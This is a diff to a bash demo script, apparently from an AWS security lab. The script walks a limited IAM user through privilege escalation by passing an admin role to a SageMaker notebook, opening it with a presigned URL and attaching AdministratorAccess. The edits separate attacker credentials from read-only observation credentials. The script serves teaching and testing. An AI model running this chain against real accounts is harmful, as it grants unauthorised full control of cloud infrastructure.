@@ -75,24 +75,44 @@ if [ -z "$AWS_REGION" ]; then
     AWS_REGION="us-east-1"
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
-# Verify starting user identity
+# [EXPLOIT] Verify starting user identity
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
@@ -103,15 +123,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -121,24 +143,13 @@ else
 fi
 echo ""
 
-# Step 5: List available roles to find the passable admin role
-echo -e "${YELLOW}Step 5: Discovering available privileged roles${NC}"
-echo "Listing roles (looking for passable admin role)..."
-show_cmd "Attacker" "aws iam list-roles --query "Roles[?contains(RoleName, \`passable\`)].{Name:RoleName, Arn:Arn}" --output table"
-aws iam list-roles --query 'Roles[?contains(RoleName, `passable`)].{Name:RoleName, Arn:Arn}' --output table
-
 ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$PASSABLE_ROLE"
+echo "Target role ARN: $ROLE_ARN"
 echo ""
-echo "Found target role: $PASSABLE_ROLE"
-echo "Role ARN: $ROLE_ARN"
 
-# # Verify role has admin permissions
-# echo "Checking role permissions..."
-# aws iam list-attached-role-policies --role-name $PASSABLE_ROLE --query 'AttachedPolicies[*].PolicyArn' --output table
-# echo -e "${GREEN}✓ Discovered passable admin role${NC}\n"
-
-# Step 6: Create SageMaker notebook instance with admin role
-echo -e "${YELLOW}Step 6: Creating SageMaker notebook instance with admin role${NC}"
+# [EXPLOIT] Step 5: Create SageMaker notebook instance with admin role
+echo -e "${YELLOW}Step 5: Creating SageMaker notebook instance with admin role${NC}"
+use_starting_creds
 echo "Notebook name: $NOTEBOOK_NAME"
 echo "Instance type: ml.t3.medium"
 echo "Role: $PASSABLE_ROLE"
@@ -153,8 +164,9 @@ aws sagemaker create-notebook-instance \
 
 echo -e "${GREEN}✓ Successfully created notebook instance${NC}\n"
 
-# Step 7: Wait for notebook to reach InService status
-echo -e "${YELLOW}Step 7: Waiting for notebook instance to be ready${NC}"
+# [OBSERVATION] Step 6: Wait for notebook to reach InService status
+echo -e "${YELLOW}Step 6: Waiting for notebook instance to be ready${NC}"
+use_readonly_creds
 echo "This typically takes 5-8 minutes..."
 echo ""
 
@@ -163,6 +175,7 @@ ATTEMPT=0
 STATUS=""
 
 while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
+    show_cmd "ReadOnly" "aws sagemaker describe-notebook-instance --region $AWS_REGION --notebook-instance-name $NOTEBOOK_NAME --query 'NotebookInstanceStatus' --output text"
     STATUS=$(aws sagemaker describe-notebook-instance \
         --region $AWS_REGION \
         --notebook-instance-name $NOTEBOOK_NAME \
@@ -188,8 +201,9 @@ if [ "$STATUS" != "InService" ]; then
 fi
 echo ""
 
-# Step 8: Display notebook access options
-echo -e "${YELLOW}Step 8: Accessing the notebook instance${NC}"
+# [EXPLOIT] Step 7: Generate presigned URL to access the notebook
+echo -e "${YELLOW}Step 7: Accessing the notebook instance${NC}"
+use_starting_creds
 echo -e "${YELLOW}The SageMaker notebook is now running with admin privileges.${NC}"
 echo -e "${YELLOW}You have two options to access it:${NC}\n"
 
@@ -202,7 +216,7 @@ echo -e "${YELLOW}Note: This works if you're already authenticated in the AWS Co
 # Option 2: Presigned URL
 echo -e "${GREEN}Option 2: Presigned URL (works without console login)${NC}"
 echo "Generating presigned URL (valid for 12 hours)..."
-show_cmd "Attacker" "aws sagemaker create-presigned-notebook-instance-url --region $AWS_REGION --notebook-instance-name $NOTEBOOK_NAME --query 'AuthorizedUrl' --output text"
+show_attack_cmd "Attacker" "aws sagemaker create-presigned-notebook-instance-url --region $AWS_REGION --notebook-instance-name $NOTEBOOK_NAME --query 'AuthorizedUrl' --output text"
 PRESIGNED_URL=$(aws sagemaker create-presigned-notebook-instance-url \
     --region $AWS_REGION \
     --notebook-instance-name $NOTEBOOK_NAME \
@@ -212,7 +226,7 @@ PRESIGNED_URL=$(aws sagemaker create-presigned-notebook-instance-url \
 echo -e "${BLUE}$PRESIGNED_URL${NC}"
 echo -e "${GREEN}✓ Successfully generated presigned URL${NC}\n"
 
-# Step 9: Display instructions for manual exploitation
+# Step 8: Display instructions for manual exploitation
 echo -e "${BLUE}========================================${NC}"
 echo -e "${BLUE}MANUAL EXPLOITATION REQUIRED${NC}"
 echo -e "${BLUE}========================================${NC}\n"
@@ -236,11 +250,29 @@ echo -e "\n${YELLOW}Waiting 15 seconds for IAM policy to propagate...${NC}"
 sleep 15
 echo -e "${GREEN}✓ Policy propagated${NC}\n"
 
-# Step 10: Verify administrator access
-echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
+# [OBSERVATION] Step 9: Verify administrator access
+echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
+use_readonly_creds
+echo "Checking if AdministratorAccess is now attached to starting user..."
+
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER\" --query 'AttachedPolicies[*].PolicyArn' --output text"
+ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
+    --user-name "$STARTING_USER" \
+    --query 'AttachedPolicies[*].PolicyArn' \
+    --output text 2>/dev/null)
+
+if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
+    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER${NC}"
+else
+    echo -e "${RED}✗ AdministratorAccess policy not found on $STARTING_USER${NC}"
+    echo -e "${YELLOW}You may need to run the command in Jupyter terminal first${NC}"
+    exit 1
+fi
+
+echo ""
 echo "Attempting to list IAM users..."
 
-show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -257,10 +289,10 @@ echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (limited permissions)"
-echo "2. Listed available roles and found: $PASSABLE_ROLE"
-echo "3. Created SageMaker notebook: $NOTEBOOK_NAME"
-echo "4. Passed admin role to notebook via iam:PassRole"
-echo "5. Generated presigned URL to access Jupyter"
+echo "2. Confirmed no admin access (cannot list IAM users)"
+echo "3. Created SageMaker notebook: $NOTEBOOK_NAME with admin role via iam:PassRole"
+echo "4. Waited for notebook to reach InService status"
+echo "5. Generated presigned URL to access Jupyter terminal"
 echo "6. Used notebook's admin role to grant admin policy to starting user"
 echo "7. Achieved: Full administrator access"
 
